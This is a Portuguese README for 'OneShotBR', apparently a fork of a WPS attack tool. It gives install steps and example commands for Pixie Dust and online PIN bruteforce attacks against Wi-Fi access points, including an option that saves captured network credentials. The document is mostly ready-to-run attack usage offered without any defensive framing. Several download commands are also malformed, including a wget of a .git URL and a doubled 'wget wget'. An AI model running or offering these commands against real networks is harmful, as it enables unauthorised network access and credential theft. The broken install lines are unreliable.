
# Visão Geral:
**OneShot**  [Pixie Dust attack](https://forums.kali.org/showthread.php?24286-WPS-Pixie-Dust-Attack-Offline-WPS-Attack) É Necessario mudar  para o modo monitor.
# Caracteristicas:
 - [Pixie Dust attack](https://forums.kali.org/showthread.php?24286-WPS-Pixie-Dust-Attack-Offline-WPS-Attack);
 - Funcões integradas  [3WiFi offline WPS PIN generator](https://3wifi.stascorp.com/wpspin);
 - [online WPS bruteforce](https://sviehb.files.wordpress.com/2011/12/viehboeck_wps.pdf);
 - Wi-Fi scanner com realce baseado em iw;
# Requerimentos:
 - Python 3.6 Ou superior;
 - [Wpa supplicant](https://www.w1.fi/wpa_supplicant/);
 - [Pixiewps](https://github.com/wiire-a/pixiewps);
 - [iw](https://wireless.wiki.kernel.org/en/users/documentation/iw).
# Instalação:
## Debian/Ubuntu
**Instalando Requerimentos**
 ```
 sudo apt install -y python3 wpasupplicant iw wget
 ```
**Instalando o  Pixiewps**

***Ubuntu 18.04 ou superior. Debian 10 ou superior***
 ```
 sudo apt install -y pixiewps
 ```
 
***Para outras Versões do linux***
 ```
 sudo apt install -y build-essential unzip
 wget https://github.com/wiire-a/pixiewps/archive/master.zip && unzip master.zip
 cd pixiewps*/
 make
 sudo make install
 ```
**Baixando o OneShotbr**
 ```
 cd ~
 wget https://github.com/D1hhh/OneshotBR.py.git
 ```
Opcional: obter uma lista de dispositivos vulneráveis ​​ao PIXIE-DUST para destacar nos resultados da verificação
 ```
 wget https://github.com/D1hhh/OneshotBR.py/blob/main/vulnwsc.txt
 ```
## Arch Linux
**Requerimentos de Instalação**
 ```
 sudo pacman -S wpa_supplicant pixiewps wget python
 ```
**Obtendo OneShot**
 ```
 wget  wget https://github.com/D1hhh/OneshotBR.py.git
 ```
Opcional: obter uma lista de dispositivos vulneráveis ​​ao PIXIE-DUST para destacar nos resultados da verificação
 ```
 wget https://github.com/D1hhh/OneshotBR.py/blob/main/vulnwsc.txt
 ```
## Alpine Linux
Também pode ser usado para rodar em dispositivos Android usando [Linux Deploy](https://play.google.com/store/apps/details?id=ru.meefik.linuxdeploy)

**Requerimentos para Instalação**  
Adicionando o repositório de testes:
 ```
 sudo sh -c 'echo "http://dl-cdn.alpinelinux.org/alpine/edge/testing/" >> /etc/apk/repositories'
 ```
 ```
 sudo apk add python3 wpa_supplicant pixiewps iw
 ```
 **Obtendo OneShot**
 ```
 wget https://github.com/D1hhh/OneshotBR.py.git
 ```
Opcional: obter uma lista de dispositivos vulneráveis ​​ao PIXIE-DUST para destacar nos resultados da verificação
 ```
 wget https://github.com/D1hhh/OneshotBR.py/blob/main/vulnwsc.txt
 ```
## [Termux](https://termux.com/)
Observe que o acesso root é necessário  


#### Manual
**Requerimentos de instalação**
 ```
 pkg install -y root-repo
 pkg install -y git tsu python wpa-supplicant pixiewps iw openssl
 ```
**Obtendo  OneShot**
 ```
 git clone --depth 1  https://github.com/D1hhh/OneshotBR.py.git
 ```
#### Iniciando o Oneshot
 ```
 sudo python3 ./oneshotbr.py -i wlan0 --iface-down -K
 ```

# Use os comandos a baixo caso
```
"""
                                         OneShotPy 0.0.2br (c) 2024
                                      #################################
                         I########################################################I
                         I>>>>>>>>>>Modificado e traduzido por NÓIA_ROOT<<<<<<<<<<I
                         I########################################################I

./Oneshotbr.py <argumentos>

Argumentos Requeridos:
    -i, --interface=<wlan0>  : Nome da interface a ser usada
#######################################################################################################################################
Argumentos Opcionais:
    -b, --bssid=<mac>        : BSSID do AP alvo
    -p, --pin=<wps pin>      : Use o pino especificado (string arbitrária ou pin de 4/8 dígitos)
    -K, --pixie-dust         : Execute o ataque Pixie Dust
    -B, --bruteforce         : Execute um ataque de força bruta online
    --push-button-connect    : Execute a conexão do botão WPS
######################################################################################################################################
Argumentos Avançados:
    -d, --delay=<n>          : Defina o atraso entre as tentativas de fixação [0]
    -w, --write              : Grave credenciais de AP no arquivo em caso de sucesso
    -F, --pixie-force        : Execute Pixiewps com a opção --force (força bruta))
    -X, --show-pixie-cmd     : Sempre imprima o comando Pixiewps
    --vuln-list=<filename>   : Use arquivo personalizado com lista de dispositivos vulneráveis ['vulnwsc.txt']
    --iface-down             : Interface de rede desligada quando o trabalho for concluído
    -l, --loop               : Correr em ciclos
    -r, --reverse-scan       : Ordem inversa das redes na lista de redes. Útil em telas pequenas
    --mtk-wifi               : Ative o driver da interface Wi-Fi MediaTek na inicialização e desative-o ao sair
                               (Para adaptadores Wi-Fi internos implementados em SoCs MediaTek). Desligue o Wi-Fi nas configurações do        sistema antes de usar este.
    -v, --verbose            : Saída detalhada
#######################################################################################################################################
Exemplo:
    ./oneshotbr.py -i wlan0 -b 00:90:4C:C1:AC:21 -K
"""
 ```

## Exemplos de uso
Inicie o ataque Pixie Dust em um determinado BSSID:
 ```
 sudo python3 ./oneshotbr.py -i wlan0 -b 00:90:4C:C1:AC:21 -K
 ```
Mostrar redes disponíveis e iniciar o ataque Pixie Dust em uma rede específica:
 ```
 sudo python3 ./oneshotbr.py -i wlan0 -K
 ```
Inicie o WPS Bruteforce online com a primeira metade especificada do PIN:
 ```
 sudo python3 ./oneshotbr.py -i wlan0 -b 00:90:4C:C1:AC:21 -B -p 1234
 ```
 Iniciar conexão com botão WPS:s
 ```
 sudo python3 ./oneshotbr.py -i wlan0 --pbc
 ```
## Solução de problemas
#### "RTNETLINK responde: Operação não é possível devido ao RF-kill"
 Apenas digite no conole:
```sudo rfkill unblock wifi```
#### "Dispositivo ou recurso ocupado (-16)"
 Tente desabilitar o Wi-Fi nas configurações do sistema e encerrar o gerenciador de rede. Alternativamente, você pode tentar executar o OneShot com o argumento ```--iface-down```.
#### A interface wlan0 desaparece quando o Wi-Fi é desativado em dispositivos Android com MediaTek SoC
 Tente executar o OneShot com o sinalizador `--mtk-wifi` para inicializar o driver do dispositivo Wi-Fi.

